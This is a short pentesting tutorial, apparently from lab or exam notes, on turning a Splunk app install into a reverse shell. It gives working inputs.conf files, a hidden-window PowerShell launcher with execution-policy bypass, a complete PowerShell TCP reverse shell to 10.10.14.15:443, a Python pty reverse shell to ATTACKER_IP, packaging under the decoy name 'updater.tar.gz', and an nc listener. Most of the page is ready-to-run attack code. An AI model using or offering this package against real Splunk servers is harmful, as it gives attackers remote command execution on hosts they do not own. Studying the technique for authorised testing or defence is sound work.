#### Abusing Built In Functionality for Rev Shell

[example repo](https://github.com/0xjpuff/reverse_shell_splunk)
splunk directory tree
```shell-session
splunk_shell/
├── bin
└── default
```
The `bin` directory will contain any scripts that we intend to run (in this case, a PowerShell reverse shell), and the default directory will have our `inputs.conf` file. Our reverse shell will be a PowerShell one-liner.

inputs.conf data [linux]
```shell-session
[script://./bin/rev.py]
disabled = 0  
interval = 10  
sourcetype = shell 
```
```
```
inputs.conf data [windows]
```
[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
```
The [inputs.conf](https://docs.splunk.com/Documentation/Splunk/latest/Admin/Inputsconf) file tells Splunk which script to run and any other conditions. Here we set the app as enabled and tell Splunk to run the script every 10 seconds. The interval is always in seconds, and the input (script) will only run if this setting is present.


We need the .bat file, which will run when the application is deployed and execute the PowerShell one-liner. [windows]
```shell-session
@ECHO OFF
PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
Exit
```


[windows]script
```powershell-session
#A simple and small reverse shell. Options and help removed to save space. 
#Uncomment and change the hardcoded IP address and port number in the below line. Remove all help comments as well.
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.15',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

[linux] script
```python
import sys,socket,os,pty

ip="ATTACKER_IP"
port="443"
s=socket.socket()
s.connect((ip,int(port)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')
```

package everything together
```shell-session
tar -cvzf updater.tar.gz splunk_shell/
```

upload file to splunk using "`Install app from file`"

open listener
```shell-session
sudo nc -lnvp 443
```
